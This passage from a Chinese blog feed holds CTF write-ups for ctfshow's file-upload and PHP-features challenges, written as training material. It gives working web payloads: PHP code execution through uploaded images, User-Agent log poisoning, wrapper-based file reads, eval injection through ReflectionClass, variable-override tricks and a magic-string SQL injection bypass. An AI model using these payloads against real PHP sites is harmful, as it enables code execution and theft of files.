class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>继续增加过滤的限制</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227223054918.png" alt="image-20230227223054918"></p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> (<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../f*&#x27;</span>)) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>不用getshell，直接在图片里写tac命令把flag读出来，后面上传完配置文件后访问index.php页面就好了</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227223256714.png" alt="image-20230227223256714"></p><h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p>同上</p><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><p>过滤了括号，使用反引号&#96;&#96;执行命令</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `tac ../f*` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227223839698.png" alt="image-20230227223839698"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227223923759.png" alt="image-20230227223923759"></p><h1 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h1><p>反引号也被限制，日志文件包含</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227225326585.png" alt="image-20230227225326585"></p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>然后上传.user.ini的同时将user-agent改为</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../f*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>再去访问index.php</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227225726166.png" alt="image-20230227225726166"></p><p>因为.log不像php是后端语言，所以这里include就直接显示出来了</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow PHP特性</title>
      <link href="/2023/01/29/PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2023/01/29/PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>前面的部分有的图片没有成功上传图床所以并不全</p><h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>由于preg_match()只能处理字符串，当传入的是数组时将会返回false,从而绕过死亡函数。</p><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p>&#x3D;&#x3D;&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等</p><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p>&#x2F;i表示匹配大小写，&#x2F;m表示多行匹配，&#x2F;s 匹配任何空白字符，包括空格、制表符、换页符等等。</p><p>字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配到以php开头和以php结尾的字符串才会返回true，否则返回false</p><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p>PHP strpos() 函数:查找某字符串在整个字符串中第一次出现的位置</p><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>md5强比较：利用md5函数处理数组类型会返回false的特性，从而利用false&#x3D;false来绕过</p><h1 id="BJDCTF-2020-easy-md5"><a href="#BJDCTF-2020-easy-md5" class="headerlink" title="[BJDCTF 2020]easy_md5"></a>[BJDCTF 2020]easy_md5</h1><p>sql注入但需绕过后端md5的检测</p><p>用<code>ffifdyop</code>绕过， md5函数在指定了true的时候，是返回的原始 16 字符<a href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">二进制</a>格式。</p><p>ffifdyop 这个字符串被 md5 <a href="https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C&spm=1001.2101.3001.7020">哈希</a>了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是’ or ‘6</p><p>后面用数组绕过就行</p><h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><p>PHP里面 <code>=</code>的优先级是比<code>and</code>优先级高的</p><p><code>and or</code>和<code>&amp;&amp; ||</code>区别就是优先级不同前者的在<code>=</code>后面,后者在<code>=</code>前面</p><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>在程序运行中，对于任意的一个类，【通过反射类都能够知道这个类的属性和方法】</p><p> 通过反射类可以获取 【对象的命名空间，对象的名字等】</p><p>根据提示，flag已在class类中,因此：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure></div><h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230105170920986.png" alt="image-20230105170920986"></p><p>科学计数法绕过(115044383959474e6864434171594473)(&lt;?&#x3D;<code>cat *</code>;)</p><p>hex2bin利用call_user_func()</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">post:v1=hex2bin</span><br></pre></td></tr></table></figure></div><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><p>同web102</p><h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p><code>sha1()</code>函数无法处理数组类型，会返回NULL，if条件就成立了</p><p>或者</p><div class="highlight-wrap" data-rel="Dns"><figure class="iseeu highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaK1STfY</span><br><span class="line">↓</span><br><span class="line"><span class="number">0</span>e766585266557562076882711596<span class="number">24026011393</span></span><br><span class="line">aaO8zKZF</span><br><span class="line">↓</span><br><span class="line"><span class="number">0</span>e89257456677279068558073954<span class="number">252716165668</span></span><br></pre></td></tr></table></figure></div><h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><p>php变量覆盖漏洞</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>在对于GET的循环中，由<code>$$key=$$value;</code>得到<code>$suces=$flag</code>；在对于POST的循环中，同样可以得到<code>$error=$suces</code>，那么有<code>$error=$flag</code>，从而<code>die($flag);</code>输出flag。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?suces=flag</span><br><span class="line">POST: ?error=suces</span><br></pre></td></tr></table></figure></div><h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><p>sha1考点，上面有</p><h1 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h1><p>PHP parse_str() 函数：把查询字符串解析到变量中</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230105213142982.png" alt="image-20230105213142982"></p><p>v1、v3都为空数组即可</p><h1 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h1><p>ereg()函数存在NULL截断漏洞</p><p>%00截断正则匹配，格式化字符不会当作数字被url解析</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure></div><h1 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></div><p><code>__toString()</code>：当一个对象被当作字符串对待的时候，会触发这个魔术方法，格式化输出这个对象所包含的数据。</p><p>PHP5.2.0之前，__toString() 方法只在使用 echo 或 print 时才生效。PHP5.2.0之后，可以在任何字符串环境生效。</p><p>不少php的内置类里都包含有这个方法，如<code>Reflectionclass</code>、<code>Exception</code>、<code>Error</code>。</p><p>echo使得<code>$v1</code>类触发<code>__toString()</code>，传递的参数v2会被输出。</p><p>对于v2后面的括号：只要变量后面紧跟着()，那么对这个变量进行函数调用。</p><p>如可以让返回值是<a href="https://so.csdn.net/so/search?q=phpinfo&spm=1001.2101.3001.7020">phpinfo</a>，就可以调用phpinfo()</p><h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><p>php原生类</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c777d70e-1cee-4db9-9d32-bcbed2454002.challenge.ctf.show/?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure></div><p>利用 FilesystemIterator 获取指定目录下的所有文件,FilesystemIterator继承父类DirectoryIterator的_toString方法</p><p>getcwd()函数 获取当前工作目录 返回当前工作目录 </p><h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><p>看到两个$,变量覆盖</p><p>用$v2去覆盖$v1的值</p><p>v1的值为ctfshow，将$v1覆盖为GLOBALS,配合var_dump可以返回全局作用域中可用的全部变量</p><p>flag作为全局变量会被带出来</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://84567e21-dee0-4bf8-be50-dcf58764d719.challenge.ctf.show/?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure></div><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><p>伪协议绕过检测</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br></pre></td></tr></table></figure></div><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><p>zlib伪协议</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47126220-82d8-4d30-8511-5af68172ae05.challenge.ctf.show/?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure></div><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><p>同112</p><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><p>%0c绕过trim函数的限制同时因为&#x3D;&#x3D;和!&#x3D;&#x3D;的判断标准不同因此可以成立</p><h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><p>post用引用的方式传参，但是在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为<code>_</code>，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p><h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=var_export(get_defined_vars())</span><br></pre></td></tr></table></figure></div><p>使用get_defined_vars()代替GLOBALS</p><h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span 